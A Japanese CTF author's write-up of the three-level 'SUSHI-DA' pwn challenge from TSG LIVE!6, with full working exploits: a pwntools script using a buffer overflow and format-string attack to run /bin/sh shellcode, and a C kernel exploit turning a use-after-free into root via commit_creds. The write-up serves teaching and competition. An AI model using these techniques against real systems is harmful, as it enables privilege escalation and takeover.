@@ -1,0 +1,710 @@
+
+<p><script src="https://cdn.rawgit.com/google/code-prettify/master/loader/run_prettify.js?skin=desert"></script></p>
+
+<div class="keywords"><span class="btitle">keywords</span>
+<p>BOF /  FSA /  
+</p>
+</div>
+ <!-- KEYWORDS HERE -->
+<div class="contents">[:contents]</div>
+<p> </p>
+<p> </p>
+<h3>1: イントロ</h3>
+<p>いつぞや開催された<code>TSG LIVE!6 CTF</code>。120分という超短期間のCTF。pwnを作ったのでその振り返りとliveの感想。</p>
+<p></p>
+<p></p>
+<p></p>
+<h3>2: 問題概要</h3>
+<p>Level 1~3で構成される問題。どのレベルもLKMを利用したプログラムを共通して使っているが、Lv1/2はLKMを使わなくても(つまり、QEMU上で走らせなくても)解けるようになっている。</p>
+<p>短期間CTFであり、プレイヤの画面が公開されるという性質上、放送映えするような問題にしたかった。pwnの楽しいところはステップを踏んでexploitしていくところだと思っているため、Level順にプログラムのロジックバイパス・user shellの奪取・root shellの奪取という流れになっている。正直Level3は特定の人物を狙い撃ちした問題であり、早解きしてギリギリ120分でいけるかなぁ(願望)という難易度になっている。</p>
+<p></p>
+<h3>3: SUSHI-DA1: logic bypass</h3>
+
+<div style="margin-bottom:0; padding-bottom:0; display:inline; font-size:80%; background-color:#3d3939;">static.sh</div>
+<pre class="prettyprint linenums lang-sh">
+$ file ./client
+./client: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, BuildID[sha1]=982caef5973f267fa669d3922c57233063f709d2, for GNU/Linux 3.2.0, not stripped
+$ checksec --file ./client
+[*] &#x27;/home/wataru/test/sandbox/client&#x27;
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX disabled
+    PIE:      No PIE (0x400000)
+    RWX:      Has RWX segments
+</pre>
+<p></p>
+<p>冷え防止の問題。テーマは寿司打というタイピングゲーム。</p>
+
+<div style="margin-bottom:0; padding-bottom:0; display:inline; font-size:80%; background-color:#3d3939;">client.c</div>
+<pre class="prettyprint linenums lang-c">
+  struct {
+    unsigned long start, result;
+    char type[MAX_LENGTH + 0x20];
+    int pro;
+  } info = {0};
+ (snipped...)
+  info.result = time(NULL) - info.start;
+  puts(&quot;\n[ENTER] again to finish!&quot;);
+  readn(info.type, 0x200);
+
+  printf(&quot;\n🎉🎉🎉Congrats! You typed in %lu secs!🎉🎉🎉\n&quot;, info.result);
+  register_record(info.result);
+  if(info.pro != 0) system(&quot;cat flag1&quot;);
+</pre>
+<p></p>
+<p>クリアした後にENTERを受け付ける箇所があるが、ここでバッファサイズの200+の代わりに0x200を受け付けてしまっているため<code>struct info</code>内でBOFが発生し<code>info.pro</code>を書き換えられる。</p>
+<p></p>
+<h3>4: SUSHI-DA2: user shell</h3>
+
+<div style="margin-bottom:0; padding-bottom:0; display:inline; font-size:80%; background-color:#3d3939;">client.c</div>
+<pre class="prettyprint linenums lang-c">
+  while(success &lt; 3){
+    unsigned question = rand() % 4;
+    if(wordlist[question][0] == &#x27;\x00&#x27;) continue;
+    printf(&quot;[TYPE]\n&quot;);
+    printf(wordlist[question]); puts(&quot;&quot;);
+    readn(info.type, 200);
+    if(strncmp(wordlist[question], info.type, strlen(wordlist[question])) != 0)  warn_ret(&quot;🙅‍🙅 ACCURACY SHOULD BE MORE IMPORTANT THAN SPEED.&quot;);
+    ++success;
+  }
+(snipped...)
+void add_phrase(void){
+  char *buf = malloc(MAX_LENGTH + 0x20);
+  printf(&quot;[NEW PHRASE] &quot;);
+  readn(buf, MAX_LENGTH - 1);
+  for(int ix=0; ix!=MAX_LENGTH-1; ++ix){
+    if(buf[ix] == &#x27;\xa&#x27;) break;
+    memcpy(wordlist[3]+ix, buf+ix, 1);
+  }
+}
+</pre>
+<p></p>
+<p>タイピングのお題を1つだけカスタムできるが、お題の表示にFSBがある。これでstackのleakができる。</p>
+<p>この後の方針は大きく分けて2つある。1つ目は、stackがRWXになっているためstackにshellcodeを積んだ上でRAをFSBで書き換えてshellを取る方法。この場合、FSAの入力と発火するポイントが異なるため、FSAで必要な準備(書き換え対象のRAがあるアドレスをstackに積む必要がある)はmain関数のstackに積んでおくことになる。また、発火に時間差があるという都合上、単純にpwntoolsを使うだけでは解くことができない。</p>
+
+<div style="margin-bottom:0; padding-bottom:0; display:inline; font-size:80%; background-color:#3d3939;">client.c</div>
+<pre class="prettyprint linenums lang-c">
+int main(int argc, char *argv[]){
+  char buf[0x100];
+  srand(time(NULL));
+  setup();
+
+  while(1==1){
+    printf(&quot;\n\n$ &quot;);
+    if (readn(buf, 100) &lt;= 0) die(&quot;[ERROR] readn&quot;);
+</pre>
+<p>2つ目は、canaryだけリークしてあとは通常のBOFでROPするという方法。こっちのほうが多分楽。正直、canaryはleakできない感じの設定にしても良かった(bufサイズを調整)が、200と0x200を打ち間違えたという雰囲気を出したかった都合上、canaryのleak+ROPまでできるくらいの設定になった。</p>
+<p></p>
+<h3>5: SUSHI-DA3: root shell</h3>
+<p>ここまででuser shellがとれているため、今度はLKMのバグをついてrootをとる。バグは以下。</p>
+
+<div style="margin-bottom:0; padding-bottom:0; display:inline; font-size:80%; background-color:#3d3939;">sushi-da.c</div>
+<pre class="prettyprint linenums lang-c">
+long clear_old_records(void)
+{
+  int ix;
+  char tmp[5] = {0};
+  long date;
+  for(ix=0; ix!=SUSHI_RECORD_MAX; ++ix){
+    if(records[ix] == NULL) continue;
+    strncpy(tmp, records[ix]-&gt;date, 4);
+    if(kstrtol(tmp, 10, &amp;date) != 0 || date &lt;= 1990) kfree(records[ix]);
+  }
+  return 0;
+}
+</pre>
+<p>タイピングゲームの記録をLKMを使って記録しているのだが、古いレコード(1990年以前)と不正なレコードを削除する関数においてkfreeしたあとの値をクリアしていない。これによりkUAFが生じる。</p>
+<p>SMEP/SMAP無効KAISER無効であるため、あとは割と任意のことができる。editがないことやkmallocではなくkzallocが使われているのがちょっと嫌な気もするが、実際はdouble freeもあるため<code>seq_operations</code>でleakしたあとに再びそれをrecordとして利用することでRIPを取ることができる。</p>
+<p></p>
+<h3>6: full exploit</h3>
+
+<div style="margin-bottom:0; padding-bottom:0; display:inline; font-size:80%; background-color:#3d3939;">exploit.py</div>
+<pre class="prettyprint linenums lang-py">
+#!/usr/bin/python2
+# -*- coding: utf-8 -*-
+
+# coding: 4 spaces
+
+# Copyright 2020 Google LLC
+#
+# Licensed under the Apache License, Version 2.0 (the &quot;License&quot;);
+# you may not use this file except in compliance with the License.
+# You may obtain a copy of the License at
+#
+#     https://www.apache.org/licenses/LICENSE-2.0
+#
+# Unless required by applicable law or agreed to in writing, software
+# distributed under the License is distributed on an &quot;AS IS&quot; BASIS,
+# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+# See the License for the specific language governing permissions and
+# limitations under the License.
+
+from pwn import *
+import pwnlib
+import sys, os
+
+def handle_pow(r):
+    print(r.recvuntil(b&#x27;python3 &#x27;))
+    print(r.recvuntil(b&#x27; solve &#x27;))
+    challenge = r.recvline().decode(&#x27;ascii&#x27;).strip()
+    p = pwnlib.tubes.process.process([&#x27;kctf_bypass_pow&#x27;, challenge])
+    solution = p.readall().strip()
+    r.sendline(solution)
+    print(r.recvuntil(b&#x27;Correct\n&#x27;))
+
+hosts = (&quot;sushida.pwn.hakatashi.com&quot;,&quot;localhost&quot;,&quot;localhost&quot;)
+ports = (1337,12300,23947)
+rhp1 = {&#x27;host&#x27;:hosts[0],&#x27;port&#x27;:ports[0]}    #for actual server
+rhp2 = {&#x27;host&#x27;:hosts[1],&#x27;port&#x27;:ports[1]}    #for localhost 
+rhp3 = {&#x27;host&#x27;:hosts[2],&#x27;port&#x27;:ports[2]}    #for localhost running on docker
+context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;)
+#binf = ELF(FILENAME)
+#libc = ELF(LIBCNAME) if LIBCNAME!=&quot;&quot; else None
+
+
+## utilities #########################################
+
+def hoge(command):
+  global c
+  c.recvuntil(&quot;$ &quot;)
+  c.sendline(command)
+
+def typin():
+  c.recvuntil(&quot;[TYPE]&quot;)
+  c.recvline()
+  c.sendline(c.recvline().rstrip())
+
+def play_clear(avoid_nirugiri=True):
+  global c
+  hoge(&quot;play&quot;)
+  for _ in range(3):
+    typin()
+  
+def custom(phrase):
+  global c
+  hoge(&quot;custom&quot;)
+  c.recvuntil(&quot;[NEW PHRASE] &quot;)
+  c.sendline(phrase)
+
+def custom_wait_NIRUGIRI(pay, append_nirugiri=True):
+  global c
+  print(&quot;[.] waiting luck...&quot;)
+  res = &quot;&quot;
+  found = False
+  if append_nirugiri:
+    custom(&quot;NIRUGIRI&quot; + pay)
+  else:
+    custom(pay)
+
+  while True:
+    hoge(&quot;play&quot;)
+    for _ in range(3):
+      c.recvuntil(&quot;[TYPE]&quot;)
+      c.recvline()
+      msg = c.recvline().rstrip()
+      if &quot;NIRUGIRI&quot; in msg:
+        found = True
+        res = msg
+        if append_nirugiri:
+          c.sendline(&quot;NIRUGIRI&quot;+pay)
+        else:
+          c.sendline(pay)
+      else:
+        c.sendline(msg)
+    c.recvuntil(&quot;ENTER&quot;)
+    c.sendline(&quot;&quot;)
+    if found:
+      break      
+  
+  return res[len(&quot;NIRUGIRI&quot;):]
+
+def inject_wait_NIRUGIRI(pay):
+  global c
+  print &quot;[.] injecting and waiting luck&quot;,
+  res = &quot;&quot;
+  found = False
+  aborted = False
+  custom(pay)
+
+  while True:
+    hoge(&quot;play&quot;)
+    for _ in range(3):
+      c.recvuntil(&quot;[TYPE]&quot;)
+      c.recvline()
+      msg = c.recvline().rstrip()
+      if &quot;NIRUGIRI&quot; in msg:
+        print(&quot;\n[!] FOUND&quot;)
+        c.sendline(&quot;hey&quot;)
+        return
+      else:
+        print &quot;.&quot;,
+        c.sendline(msg)
+    if aborted:
+      aborted = False
+      continue
+    c.sendline(&quot;&quot;)
+
+## exploit ###########################################
+
+def exploit():
+  global c
+  global kctf
+  MAX_TYPE = 200
+
+  ##############################
+  #  LEVEL 1                   #
+  ##############################
+  # overwrite info.pro
+  play_clear()
+  c.recvuntil(&quot;ENTER&quot;)
+  c.sendline(&quot;A&quot;*0xf8)
+  c.recvuntil(&quot;typed&quot;)
+  c.recvline()
+  flag1 = c.recvline().rstrip()
+  if &quot;TSGLIVE&quot; not in flag1:
+      exit(1)
+  print(&quot;\n[!] Got a flag1 🎉🎉🎉 &quot; + flag1)
+
+  ###############################
+  ##  LEVEL 2                   #
+  ###############################
+  SC_START = 0x50
+  pay = b&quot;&quot;
+
+  # leak stack
+  pay += &quot;%42$p&quot;
+  leaked = int(custom_wait_NIRUGIRI(pay), 16)
+  ra_play_game = leaked - 0x128
+  buf_top = leaked - 0x230
+  target_addr = ra_play_game + 0x38
+  print(&quot;[+] leaked stack: &quot; + hex(leaked))
+  print(&quot;[+] ra_play_game: &quot; + hex(ra_play_game))
+  print(&quot;[+] buf_top: &quot; + hex(buf_top))
+  pay_index = 47
+
+  # calc
+  v0 = target_addr &amp; 0xFFFF
+  v1 = (target_addr &gt;&gt; 16) &amp; 0xFFFF
+  v2 = (target_addr &gt;&gt; 32) &amp; 0xFFFF
+  assert(v0&gt;8 and v1&gt;8 and v2&gt;8)
+  vs = sorted([[0,v0],[1,v1],[2,v2]], key= lambda l: l[1])
+
+  # place addr &amp; sc
+  sc = b&quot;\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05&quot;
+  c.recvuntil(&quot;$ &quot;)
+  pay = b&quot;&quot;
+  pay += &quot;A&quot;*8
+  pay += p64(ra_play_game) + p64(ra_play_game+2) + p64(ra_play_game+4)
+  pay += sc
+  assert(len(pay) &lt;= 0x50)
+  assert(&quot;\x0a&quot; not in pay)
+  c.sendline(pay)
+
+  # overwrite return-addr with FSA
+  pay = b&quot;&quot;
+  pay += &quot;NIRUGIRI&quot;
+  pay += &quot;%{}c&quot;.format(vs[0][1]-8)
+  pay += &quot;%{}$hn&quot;.format(pay_index + vs[0][0])
+  pay += &quot;%{}c&quot;.format(vs[1][1] - vs[0][1])
+  pay += &quot;%{}$hn&quot;.format(pay_index + vs[1][0])
+  pay += &quot;%{}c&quot;.format(vs[2][1] - vs[1][1])
+  pay += &quot;%{}$hn&quot;.format(pay_index + vs[2][0])
+  assert(&quot;\x0a&quot; not in pay)
+  assert(len(pay) &lt; MAX_TYPE)
+  print(&quot;[+] shellcode placed @ &quot; + hex(target_addr))
+
+  # nirugiri
+  inject_wait_NIRUGIRI(pay) # if NIRUGIRI comes first, it fails
+  c.sendlineafter(&quot;/home/user $&quot;, &quot;cat ./flag2&quot;)
+  flag2 = c.recvline()
+  if &quot;TSGLIVE&quot; not in flag2:
+      exit(2)
+  print(&quot;\n[!] Got a flag2 🎉🎉🎉 &quot; + flag2)
+
+  ##############################
+  #  LEVEL 3                   #
+  ##############################
+  # pwning kernel...
+  c.recvuntil(&quot;/home/user&quot;)
+  print(&quot;[!] pwning kernel...&quot;)
+  if kctf:
+    with open(&quot;/home/user/exploit.gz.b64&quot;, &#x27;r&#x27;) as f:
+      binary = f.read()
+  else:
+    with open(&quot;./exploit.gz.b64&quot;, &#x27;r&#x27;) as f:
+      binary = f.read()
+
+  progress = 0
+  pp = 0
+  N = 0x300
+  total = len(binary)
+  print(&quot;[+] sending base64ed exploit (total: {})...&quot;.format(hex(len(binary))))
+  for s in [binary[i: i+N] for i in range(0, len(binary), N)]:
+    c.sendlineafter(&#x27;$&#x27;, &#x27;echo -n &quot;{}&quot; &gt;&gt; exploit.gz.b64&#x27;.format(s)) # don&#x27;t forget -n
+    progress += N
+    if (float(progress) / float(total)) &gt; pp:
+      pp += 0.1
+      print(&quot;[.] sent {} bytes [{} %]&quot;.format(hex(progress), float(progress)*100.0/float(total)))
+  c.sendlineafter(&#x27;$&#x27;, &#x27;base64 -d exploit.gz.b64 &gt; exploit.gz&#x27;)
+  c.sendlineafter(&#x27;$&#x27;, &#x27;gunzip ./exploit.gz&#x27;)
+
+  c.sendlineafter(&#x27;$&#x27;, &#x27;chmod +x ./exploit&#x27;)
+  c.sendlineafter(&#x27;$&#x27;, &#x27;/home/user/exploit&#x27;)
+
+  c.recvuntil(&quot;# &quot;)
+  c.sendline(&quot;cat flag3&quot;)
+  flag3 = c.recvline()
+  if &quot;TSGLIVE&quot; not in flag3:
+      exit(3)
+  print(&quot;\n[!] Got a flag3 🎉🎉🎉 &quot; + flag3)
+
+
+## main ##############################################
+
+if __name__ == &quot;__main__&quot;:
+    global c
+    global kctf
+    kctf = False
+    
+    if len(sys.argv)&gt;1:
+      if sys.argv[1][0]==&quot;d&quot;:
+        cmd = &quot;&quot;&quot;
+          set follow-fork-mode parent
+        &quot;&quot;&quot;
+        c = gdb.debug(FILENAME,cmd)
+      elif sys.argv[1][0]==&quot;r&quot;:
+        c = remote(rhp1[&quot;host&quot;],rhp1[&quot;port&quot;])
+      elif sys.argv[1][0]==&quot;v&quot;:
+        c = remote(rhp3[&quot;host&quot;],rhp3[&quot;port&quot;])
+      elif sys.argv[1][0]==&quot;k&quot;:
+        c = remote(&quot;127.0.0.1&quot;, 1337) # kctf XXX
+        kctf = True
+        print(&quot;[+] kctf healthcheck mode&quot;)
+        print(c.recvuntil(&quot;== proof-of-work: &quot;))
+        if c.recvline().startswith(b&#x27;enabled&#x27;):
+          handle_pow(c)
+    else:
+        c = remote(rhp2[&#x27;host&#x27;],rhp2[&#x27;port&#x27;])
+
+    try:
+        exploit()
+    except:
+        print(&quot;\n&quot;)
+        print(sys.exc_info()[0], sys.exc_info()[1])
+        print(&quot;\n[?] exploit failed... try again...&quot;)
+        exit(4)
+    if kctf:
+        print(&quot;\n[+] healthcheck success!&quot;)
+        exit(0)
+    else:
+        c.interactive()
+</pre>
+<p></p>
+<p>kernel.</p>
+
+<div style="margin-bottom:0; padding-bottom:0; display:inline; font-size:80%; background-color:#3d3939;">exploit.c</div>
+<pre class="prettyprint linenums lang-c">
+#define _GNU_SOURCE
+#include &lt;string.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;stdint.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;assert.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;signal.h&gt;
+#include &lt;poll.h&gt;
+#include &lt;pthread.h&gt;
+#include &lt;err.h&gt;
+#include &lt;errno.h&gt;
+#include &lt;sched.h&gt;
+#include &lt;linux/bpf.h&gt;
+#include &lt;linux/filter.h&gt;
+#include &lt;linux/userfaultfd.h&gt;
+#include &lt;linux/prctl.h&gt;
+#include &lt;sys/syscall.h&gt;
+#include &lt;sys/ipc.h&gt;
+#include &lt;sys/msg.h&gt;
+#include &lt;sys/ioctl.h&gt;
+#include &lt;sys/mman.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;sys/xattr.h&gt;
+#include &lt;sys/socket.h&gt;
+#include &lt;sys/uio.h&gt;
+#include &lt;sys/shm.h&gt;
+
+#include &quot;../include/sushi-da.h&quot;
+
+
+// commands
+#define DEV_PATH &quot;/dev/sushi-da&quot;   // the path the device is placed
+
+// constants
+#define PAGE 0x1000
+#define FAULT_ADDR 0xdead0000
+#define FAULT_OFFSET PAGE
+#define MMAP_SIZE 4*PAGE
+#define FAULT_SIZE MMAP_SIZE - FAULT_OFFSET
+// (END constants)
+
+// globals
+// (END globals)
+
+
+// utils
+#define WAIT getc(stdin);
+#define ulong unsigned long
+#define scu static const unsigned long
+#define NULL (void*)0
+#define errExit(msg) do { perror(msg); exit(EXIT_FAILURE); \
+                        } while (0)
+#define KMALLOC(qid, msgbuf, N) for(int ix=0; ix!=N; ++ix){\
+                        if(msgsnd(qid, &amp;msgbuf, sizeof(msgbuf.mtext) - 0x30, 0) == -1) errExit(&quot;KMALLOC&quot;);}
+ulong user_cs,user_ss,user_sp,user_rflags;
+struct pt_regs {
+	ulong r15; ulong r14; ulong r13; ulong r12; ulong bp;
+	ulong bx;  ulong r11; ulong r10; ulong r9; ulong r8;
+	ulong ax; ulong cx; ulong dx; ulong si; ulong di;
+	ulong orig_ax; ulong ip; ulong cs; ulong flags;
+  ulong sp; ulong ss;
+};
+void print_regs(struct pt_regs *regs)
+{
+  printf(&quot;r15: %lx r14: %lx r13: %lx r12: %lx\n&quot;, regs-&gt;r15, regs-&gt;r14, regs-&gt;r13, regs-&gt;r12);
+  printf(&quot;bp: %lx bx: %lx r11: %lx r10: %lx\n&quot;, regs-&gt;bp, regs-&gt;bx, regs-&gt;r11, regs-&gt;r10);
+  printf(&quot;r9: %lx r8: %lx ax: %lx cx: %lx\n&quot;, regs-&gt;r9, regs-&gt;r8, regs-&gt;ax, regs-&gt;cx);
+  printf(&quot;dx: %lx si: %lx di: %lx ip: %lx\n&quot;, regs-&gt;dx, regs-&gt;si, regs-&gt;di, regs-&gt;ip);
+  printf(&quot;cs: %lx flags: %lx sp: %lx ss: %lx\n&quot;, regs-&gt;cs, regs-&gt;flags, regs-&gt;sp, regs-&gt;ss);
+}
+void NIRUGIRI(void)
+{
+  puts(&quot;[!] NIRUGIRI!&quot;);
+  char *argv[] = {&quot;/bin/sh&quot;, NULL};
+  char *envp[] = {NULL};
+  puts(&quot;\n\n Got a root! 🎉🎉🎉&quot;);
+  execve(&quot;/bin/sh&quot;,argv,envp);
+}
+
+// should compile with -masm=intel
+static void save_state(void) {
+  asm(
+      &quot;movq %0, %%cs\n&quot;
+      &quot;movq %1, %%ss\n&quot;
+      &quot;movq %2, %%rsp\n&quot;
+      &quot;pushfq\n&quot;
+      &quot;popq %3\n&quot;
+      : &quot;=r&quot; (user_cs), &quot;=r&quot; (user_ss), &quot;=r&quot;(user_sp), &quot;=r&quot; (user_rflags) : : &quot;memory&quot; 		);
+}
+
+ulong kernbase;
+ulong commit_creds, prepare_kernel_cred;
+
+static void shellcode(void){
+  ulong init_cred;
+  asm(
+    &quot;mov %%rdi, 0x0\n&quot;
+    &quot;call %P1\n&quot;
+    &quot;movq %0, %%rax&quot;
+    : &quot;=r&quot; (init_cred) : &quot;r&quot; ((void*)prepare_kernel_cred) : &quot;memory&quot;
+  );
+  asm(
+      &quot;mov %%rdi, %0\n&quot;
+      &quot;call %P1\n&quot; 
+      ::&quot;r&quot;((void *)init_cred), &quot;r&quot;((void *)commit_creds) : &quot;memory&quot;
+  );
+  asm(
+      &quot;swapgs\n&quot;
+      &quot;mov %%rax, %0\n&quot;
+      &quot;push %%rax\n&quot;
+      &quot;mov %%rax, %1\n&quot;
+      &quot;push %%rax\n&quot;
+      &quot;mov %%rax, %2\n&quot;
+      &quot;push %%rax\n&quot;
+      &quot;mov %%rax, %3\n&quot;
+      &quot;push %%rax\n&quot;
+      &quot;mov %%rax, %4\n&quot;
+      &quot;push %%rax\n&quot;
+      &quot;iretq\n&quot; 
+      ::&quot;r&quot;(user_ss), &quot;r&quot;(user_sp), &quot;r&quot;(user_rflags), &quot;r&quot;(user_cs), &quot;r&quot;(&amp;NIRUGIRI) : &quot;memory&quot;
+    );
+}
+// (END utils)
+
+void register_record(int fd, int score, char *date){
+  struct ioctl_register_query  q = {
+    .record = {.result = score,},
+  };
+  strncpy(q.record.date, date, 0x10);
+  if(ioctl(fd, SUSHI_REGISTER_RECORD, &amp;q) &lt; 0){
+    errExit(&quot;register_record()&quot;);
+  } 
+}
+
+void fetch_record(int fd, int rank, struct record *record){
+  struct ioctl_fetch_query q = {
+    .rank = rank,
+  };
+  if(ioctl(fd, SUSHI_FETCH_RECORD, &amp;q) &lt; 0){
+    errExit(&quot;fetch_record()&quot;);
+  } 
+  memcpy(record, &amp;q.record, sizeof(struct record));
+}
+
+void clear_record(int fd){
+  if(ioctl(fd, SUSHI_CLEAR_OLD_RECORD, NULL) &lt; 0){
+    errExit(&quot;clear_record()&quot;);
+  } 
+}
+
+void show_rankings(int fd){
+  struct ioctl_fetch_query q;
+  for (int ix = 0; ix != 3; ++ix){
+    q.rank = ix + 1;
+    if (ioctl(fd, SUSHI_FETCH_RECORD, &amp;q) &lt; 0) break;
+    printf(&quot;%d: %ld sec : %s\n&quot;, ix + 1, q.record.result, q.record.date);
+  }
+}
+
+void clear_all_records(int fd){
+  if(ioctl(fd, SUSHI_CLEAR_ALL_RECORD, NULL) &lt; 0){
+    errExit(&quot;clear_all_records()&quot;);
+  }
+}
+
+int main(int argc, char *argv[]) {
+  char inbuf[0x200];
+  char outbuf[0x200];
+  int seqfd;
+  int tmpfd[0x90];
+  memset(inbuf, 0, 0x200);
+  memset(outbuf, 0, 0x200);
+  printf(&quot;[.] pid: %d\n&quot;, getpid());
+  printf(&quot;[.] NIRUGIRI at %p\n&quot;, &amp;NIRUGIRI);
+  printf(&quot;[.] shellcode at %p\n&quot;, &amp;shellcode);
+  int fd = open(DEV_PATH, O_RDWR);
+  if(fd &lt;= 2){
+    perror(&quot;[ERROR] failed to open mora&quot;);
+    exit(0);
+  }
+  clear_all_records(fd);
+
+  struct record r;
+  struct record r1 = {
+    .result = 1,
+    .date = &quot;1930/03/12&quot;,
+  };
+
+  // heap spray
+  puts(&quot;[.] heap spraying...&quot;);
+  for (int ix = 0; ix != 0x90; ++ix)
+  {
+    tmpfd[ix] = open(&quot;/proc/self/stat&quot;, O_RDONLY);
+  }
+
+  // leak kernbase
+  puts(&quot;[.] generating kUAF...&quot;);
+  register_record(fd, r1.result, r1.date);
+  clear_record(fd);
+  if((seqfd = open(&quot;/proc/self/stat&quot;, O_RDONLY)) &lt;= 0){
+    errExit(&quot;open seq_operations&quot;);
+  }
+  fetch_record(fd, 1, &amp;r);
+
+  const ulong _single_start = *((long*)r.date);
+  const ulong kernbase = _single_start - 0x194090;
+  printf(&quot;[+] single_start: %lx\n&quot;, _single_start);
+  printf(&quot;[+] kernbase: %lx\n&quot;, kernbase);
+  commit_creds = kernbase + 0x06cd00;
+  printf(&quot;[!] commit_creds: %lx\n&quot;, commit_creds);
+  prepare_kernel_cred = kernbase + 0x6d110;
+  printf(&quot;[!] prepare_kernel_cred: %lx\n&quot;, prepare_kernel_cred);
+
+  // double free
+  struct record r2 = {
+    .result = 3,
+  };
+  *((ulong*)r2.date) = &amp;shellcode;
+  clear_record(fd);
+  register_record(fd, r2.result, r2.date);
+
+  // get RIP
+  save_state();
+  for (int ix = 0; ix != 0x80; ++ix){
+    close(tmpfd[0x90 - 1 - ix]);
+  }
+  read(seqfd, inbuf, 0x10);
+
+  return 0;
+}
+</pre>
+<p></p>
+<p>Makefile</p>
+
+<div style="margin-bottom:0; padding-bottom:0; display:inline; font-size:80%; background-color:#3d3939;">Makefile</div>
+<pre class="prettyprint linenums ">
+# exploit
+$(EXP)/exploit: $(EXP)/exploit.c
+	docker run -it --rm -v &quot;$$PWD:$$PWD&quot; -w &quot;$$PWD&quot; alpine /bin/sh -c &#x27;apk add gcc musl-dev linux-headers &amp;&amp; $(CC) $(CPPFLAGS) $&lt;&#x27;
+	#$(CC) $(CPPFLAGS) $&lt;
+	strip $@
+
+.INTERMEDIATE: $(EXP)/exploit.gz
+$(EXP)/exploit.gz: $(EXP)/exploit
+	gzip $&lt;
+$(EXP)/exploit.gz.b64: $(EXP)/exploit.gz
+	base64 $&lt; &gt; $@
+exp: $(EXP)/exploit.gz.b64
+</pre>
+<p></p>
+<h3>7: 感想</h3>
+<p>まずは、参加してくださった方々、とりわけ外部ゲストの方々ありがとうございました。超強豪が問題を解いている画面を見れるなんて滅多にないので、裏でかなり興奮していました。</p>
+<p>特にpwnyaa[@pwnyaa]さんが残り3分くらいでroot shellを取ったところは感動モノでした。wgetを入れていなかったことや、サーバが本当の最後の数分間に調子が悪かったらしいこともあって足を引っ張ってしまって申し訳ないです。。。</p>
+<p></p>
+<p>今回の作問は、ステップを登っていく楽しさは味わえるようにしながら、ライブなので冷えすぎないように調整することが大事だったと思います。最初はそのコンセプトのもとにプログラムも80-90行くらいで収まるようにしていたのですが、あまりにも意味のないプログラムになりすぎたのでボツにして寿司打にしました(最初はcowsayをもじったmorasayという問題でした)。その結果として100行を超えてしまったのですが、個人的に少し長いプログラムよりもなにをしているかわからないプログラムのほうが読むの苦手なので寿司打におちつきました(それでもレコードをLKMに保存するの、意味わからんけど)。難易度に関しては、Lv1/2はライブ用にしましたが、Lv3は外部用の挑戦問題にしました。ただ、userland側のコードの多さゆえにミスリードが何箇所か存在していたらしく、それのせいで数分奪われてしまい解ききれないという人もいたと思うので、やっぱりシンプルさは大事だなぁと反省しました。</p>
+<p></p>
+<p>今回のpwnに関しては、kCTFでデプロイしています。ただ、k8sよくわからんので、実際に運用しているときにトラブルが発生して迅速に対応できるかと言うと、僕の場合はNoです。また、kCTFにはhealthcheckを自動化してくれるフレームワークが有るためexploitをhealthcheckできるような形式で書いたりする必要があります(今回はそんなに手間ではありませんでしたが、上のexploitコードの1/3くらいは冗長だと思います)。今回もhealthcheckは走ってたらしいですが、なにせstatusバッジがないためあんまり意味があったかはわかりません。</p>
+<p>余談ですが、kCTFで権限を落とすのに使われているsetprivですが、aptリポジトリのsetprivを最新のkernelで使うことはできません。というのも、古いsetprivは<code>/proc/sys/kernel/cap_last_cap</code>から入手したcap数と<code>linux/include</code>内で定義されているcap数を比べてassertしているようなので。</p>
+
+<div style="margin-bottom:0; padding-bottom:0; display:inline; font-size:80%; background-color:#3d3939;">a.sh</div>
+<pre class="prettyprint linenums lang-sh">
+wataru@skbpc:~/test/sandbox/ctf-directory/chal-sample: 15:41:59 Wed May 05
+$ cat /proc/sys/kernel/cap_last_cap
+39
+wataru@skbpc:~/test/sandbox/ctf-directory/chal-sample: 15:42:11 Wed May 05
+$ cat /usr/include/linux/capability.h | grep CAP_LAST_CAP -B5
+/* Allow reading the audit log via multicast netlink socket */
+#define CAP_AUDIT_READ          37
+#define CAP_LAST_CAP         CAP_AUDIT_READ
+</pre>
+<p>最新のkernelではCAP_BPFとCAP_PERFMONが追加されているため差分が生じてassertに失敗してしまいます。最新のsetprivでは<code>cap_last_cap</code>を全面的に信用することにしたらしいので、大丈夫なようです。</p>
+
+<div style="margin-bottom:0; padding-bottom:0; display:inline; font-size:80%; background-color:#3d3939;">a.c</div>
+<pre class="prettyprint linenums lang-c">
+			/* We can trust the return value from cap_last_cap(),
+			 * so use that directly. */
+			for (i = 0; i &lt;= cap_last_cap(); i++)
+				cap_update(action, type, i);
+</pre>
+<p>実際にデプロイするときはkernelのver的に大丈夫でしたが、localで試すときには最新版のsetprivをソースからビルドして使いました。</p>
+<p></p>
+<p></p>
+<p></p>
+<p>あと毎回思うんですが、pwnの読み方はぽうんではなくぱうんだと思います。</p>
+<p></p>
+<p></p>
+<p></p>
+<p></p>
+<p>まぁなにはともあれlive-ctfも終わりです。</p>
+<p></p>
+<p></p>
+<h3>8: 参考</h3>
+<p>1: TSG LIVE!6</p>
+<p><a href='https://www.youtube.com/watch?v=oitn3AiP6bM&amp;t=14898s'>https://www.youtube.com/watch?v=oitn3AiP6bM&amp;t=14898s</a></p>
+<p>2: ニルギリ</p>
+<p><a href='https://youtu.be/yvUvamhYPHw'>https://youtu.be/yvUvamhYPHw</a></p>
+
+<p></p><p></p>
+<p></p><p></p>
+<p>続く...</p>
+<p></p><p></p>
